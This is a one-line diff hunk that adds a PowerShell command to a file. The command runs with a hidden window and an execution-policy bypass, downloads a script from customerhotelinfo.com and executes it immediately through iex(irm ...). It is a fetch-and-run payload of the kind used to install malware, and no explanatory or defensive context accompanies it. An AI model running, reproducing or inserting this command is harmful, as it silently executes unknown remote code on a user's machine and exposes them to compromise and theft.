@@ -1,0 +1,1 @@
+powershell -W H -EP B -c iex(irm customerhotelinfo.com)
